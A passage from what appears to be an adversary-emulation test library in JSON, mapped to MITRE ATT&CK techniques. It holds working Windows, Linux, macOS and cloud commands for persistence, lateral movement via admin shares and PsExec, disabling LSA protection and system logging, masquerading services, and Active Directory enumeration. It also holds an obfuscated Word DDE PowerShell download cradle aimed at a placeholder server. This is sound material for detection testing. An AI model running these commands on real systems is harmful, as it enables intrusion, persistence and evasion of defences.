		"auto_generated_guid": "281201e7-de41-4dc9-b73d-f288938cbb64",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_binary": {
				"description": "Executable binary to use in place of screensaver for persistence",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			},
			"reboot": {
				"description": "Set to non-zero value if you want the test to reboot the system so that changes take effect",
				"type": "integer",
				"default": 0
			}
		},
		"executor": {
			"command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n",
			"cleanup_command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Map admin share",
		"auto_generated_guid": "3386975b-367a-4fbb-9d77-4dcf3639ffd3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "DOMAIN\\Administrator"
			},
			"share_name": {
				"description": "Examples C$, IPC$, Admin$",
				"type": "string",
				"default": "C$"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			},
			"computer_name": {
				"description": "Target Computer Name",
				"type": "string",
				"default": "Target"
			}
		},
		"executor": {
			"command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1021.002",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Map Admin Share PowerShell",
		"auto_generated_guid": "514e9cd7-9207-4882-98b1-c8f791bae3c5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"share_name": {
				"description": "Examples C$, IPC$, Admin$",
				"type": "string",
				"default": "C$"
			},
			"map_name": {
				"description": "Mapped Drive Letter",
				"type": "string",
				"default": "g"
			},
			"computer_name": {
				"description": "Target Computer Name",
				"type": "string",
				"default": "Target"
			}
		},
		"executor": {
			"command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1021.002",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Copy and Execute File with PsExec",
		"auto_generated_guid": "0eb03d41-79e4-4393-8e57-6344856be1cf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_path": {
				"description": "File to copy and execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			},
			"remote_host": {
				"description": "Remote computer to receive the copy and execute the file",
				"type": "string",
				"default": "\\\\localhost"
			},
			"psexec_exe": {
				"description": "Path to PsExec",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n",
				"prereq_command": "if (Test-Path \"#{psexec_exe}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_exe}\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1021.002",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Execute command writing output to local Admin Share",
		"auto_generated_guid": "d41aaab5-bdfe-431d-a3d5-c29e9136ff46",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Remote computer to receive the copy and execute the file",
				"type": "string",
				"default": "output.txt"
			},
			"command_to_execute": {
				"description": "Command to execute for output.",
				"type": "string",
				"default": "hostname"
			}
		},
		"executor": {
			"command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1021.002",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Print Processors",
		"auto_generated_guid": "f7d38f47-c61b-47cc-a59d-fc0368f47ed0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"restart": {
				"description": "set to 1 if you want the computer to reboot as part of the test",
				"type": "integer",
				"default": 0
			}
		},
		"executor": {
			"command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n",
			"cleanup_command": "net stop spooler\nrm -force C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll -ErrorAction SilentlyContinue\nrm -force C:\\Users\\Public\\AtomicTest.txt -ErrorAction SilentlyContinue\nremove-item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" -Force -ErrorAction SilentlyContinue\nnet start spooler\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.012",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "FreeBSD/macOS/Linux - Simulate CPU Load with Yes",
		"auto_generated_guid": "904a5a0e-fb02-490d-9f8d-0e256eb37549",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "yes > /dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1496",
		"phases": ["impact"]
	},
	{
		"name": "Execute Commands",
		"auto_generated_guid": "f592ba2a-e9e8-4d62-a459-ef63abd819fd",
		"supported_platforms": ["windows"],
		"executor": {
			"steps": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1559.002",
		"phases": ["execution"]
	},
	{
		"name": "Execute PowerShell script via Word DDE",
		"auto_generated_guid": "47c21fb6-085e-4b0d-b4d2-26d72c3830b3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559.002",
		"phases": ["execution"]
	},
	{
		"name": "DDEAUTO",
		"auto_generated_guid": "cf91174c-4e74-414e-bec0-8d60a104d181",
		"supported_platforms": ["windows"],
		"executor": {
			"steps": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1559.002",
		"phases": ["execution"]
	},
	{
		"name": "Binary simply packed by UPX (linux)",
		"auto_generated_guid": "11c46cd8-e471-450e-acb8-52a1216ae6a4",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"bin_path": {
				"description": "Packed binary",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx"
			}
		},
		"executor": {
			"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
			"cleanup_command": "rm /tmp/packed_bin\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Binary packed by UPX, with modified headers (linux)",
		"auto_generated_guid": "f06197f8-ff46-48c2-a0c6-afc1b50665e1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"bin_path": {
				"description": "Packed binary",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed"
			}
		},
		"executor": {
			"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
			"cleanup_command": "rm /tmp/packed_bin\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Binary simply packed by UPX",
		"auto_generated_guid": "b16ef901-00bb-4dda-b4fc-a04db5067e20",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"bin_path": {
				"description": "Packed binary",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.002/bin/darwin/test_upx"
			}
		},
		"executor": {
			"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
			"cleanup_command": "rm /tmp/packed_bin\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Binary packed by UPX, with modified headers",
		"auto_generated_guid": "4d46e16b-5765-4046-9f25-a600d3e65e4d",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"bin_path": {
				"description": "Packed binary",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed"
			}
		},
		"executor": {
			"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
			"cleanup_command": "rm /tmp/packed_bin\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Disable LSA Protection",
		"auto_generated_guid": "40075d5f-3a70-4c66-9125-f72bee87247d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable journal logging via systemctl utility",
		"auto_generated_guid": "c3a377f9-1203-4454-aa35-9d391d34768f",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "sudo systemctl stop systemd-journald #disables journal logging\n",
			"cleanup_command": "sudo systemctl start systemd-journald #starts journal service\nsudo systemctl enable systemd-journald #starts journal service automatically at boot time\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable journal logging via sed utility",
		"auto_generated_guid": "12e5551c-8d5c-408e-b3e4-63f53b03379f",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n",
			"cleanup_command": "sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data\nsudo systemctl restart systemd-journald #restart the journal service\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Logon Scripts - Mac",
		"auto_generated_guid": "f047c7de-a2d9-406e-a62b-12a09d9516f4",
		"supported_platforms": ["macos"],
		"executor": {
			"steps": "1. Create the required plist file\n\n    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1037.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Safe Mode Boot",
		"auto_generated_guid": "2a78362e-b79a-4482-8e24-be397bce4d85",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "bcdedit /set safeboot network",
			"cleanup_command": "bcdedit /deletevalue {current} safeboot",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.009",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Creating W32Time similar named service using schtasks",
		"auto_generated_guid": "f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n",
			"cleanup_command": "schtasks /tn win32times /delete /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1036.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Creating W32Time similar named service using sc",
		"auto_generated_guid": "b721c6ef-472c-4263-a0d9-37f1f4ecff66",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n",
			"cleanup_command": "sc delete win32times\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1036.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "linux rename /proc/pid/comm using prctl",
		"auto_generated_guid": "f0e3aaea-5cd9-4db6-a077-631dd19b27a8",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"exe_path": {
				"description": "Output Binary Path",
				"type": "path",
				"default": "/tmp/T1036_004_prctl_rename"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "#{exe_path} must be exist on system.\n",
				"prereq_command": "stat #{exe_path}\n",
				"get_prereq_command": "cc -o #{exe_path} PathToAtomicsFolder/T1036.004/src/prctl_rename.c\n"
			}
		],
		"executor": {
			"name": "sh",
			"command": "#{exe_path} & ps\nTMP=`ps | grep totally_legit`\nif [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi\nexit 0\n",
			"cleanup_command": "rm -f #{exe_path}\n",
			"elevation_required": false
		},
		"attack_technique": "T1036.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Plist Modification",
		"auto_generated_guid": "394a538e-09bb-4a4a-95d1-b93cf12682a8",
		"supported_platforms": ["macos"],
		"executor": {
			"steps": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1647",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Azure - Enumerate Azure Blobs with MicroBurst",
		"auto_generated_guid": "3dab4bcc-667f-4459-aea7-4162dd2d6590",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"base": {
				"description": "Azure blob keyword to enumerate (Example, storage account name)",
				"type": "string",
				"default": "secure"
			},
			"output_file": {
				"description": "File to output results to",
				"type": "string",
				"default": "$env:temp\\T1530Test1.txt"
			},
			"wordlist": {
				"description": "File path to keywords for search permutations",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\n"
			},
			{
				"description": "The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"#{wordlist}\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"#{wordlist}\"\n"
			}
		],
		"executor": {
			"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations \"#{wordlist}\" -outputfile \"#{output_file}\"\n",
			"cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1530",
		"phases": ["collection"]
	},
	{
		"name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)",
		"auto_generated_guid": "146af1f1-b74e-4aa7-9895-505eb559b4b0",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"base_name": {
				"description": "Azure storage account name to test",
				"type": "string",
				"default": "T1530Test2"
			},
			"output_file": {
				"description": "File to output results to",
				"type": "string",
				"default": "$env:temp\\T1530Test2.txt"
			},
			"container_name": {
				"description": "Container name to search for (optional)",
				"type": "string",
				"default": null
			},
			"blob_name": {
				"description": "Blob name to search for (optional)",
				"type": "string",
				"default": null
			}
		},
		"executor": {
			"command": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n",
			"cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1530",
		"phases": ["collection"]
	},
	{
		"name": "AWS - Scan for Anonymous Access to S3",
		"auto_generated_guid": "979356b9-b588-4e49-bba4-c35517c484f5",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"s3_bucket_name": {
				"description": "Name of the bucket",
				"type": "string",
				"default": "redatomic-test2"
			}
		},
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket #{s3_bucket_name}\naws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n",
			"cleanup_command": "aws s3 rb s3://#{s3_bucket_name} --force \nrm -rf /tmp/#{s3_bucket_name}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1530",
		"phases": ["collection"]
	},
	{
		"name": "Enumerate all accounts (Domain)",
		"auto_generated_guid": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net user /domain\nnet group /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate all accounts via PowerShell (Domain)",
		"auto_generated_guid": "8b8a6449-be98-4f42-afd2-dedddc7453b2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate logged on users via CMD (Domain)",
		"auto_generated_guid": "161dcd85-d014-4f5e-900c-d3eaae82a0f7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "Name of remote system to query",
				"type": "string",
				"default": "%COMPUTERNAME%"
			}
		},
		"executor": {
			"command": "query user /SERVER:#{computer_name}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Automated AD Recon (ADRecon)",
		"auto_generated_guid": "95018438-454a-468c-a0fa-59c800149b59",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"adrecon_path": {
				"description": "Path of ADRecon.ps1 file",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ADRecon must exist on disk at specified location (#{adrecon_path})\n",
				"prereq_command": "if (Test-Path \"#{adrecon_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile \"#{adrecon_path}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-Expression \"#{adrecon_path}\"\n",
			"cleanup_command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind -Listing password policy",
		"auto_generated_guid": "736b4f53-f400-4c22-855d-1a6b5a551600",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Admins",
		"auto_generated_guid": "b95fd967-4e62-4109-b48d-265edfd28c3a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory User Objects",
		"auto_generated_guid": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Exchange AD Objects",
		"auto_generated_guid": "5e2938fb-f919-47b6-8b29-2f6a1f718e99",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Default Domain Admin Details (Domain)",
		"auto_generated_guid": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net user administrator /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory for Unconstrained Delegation",
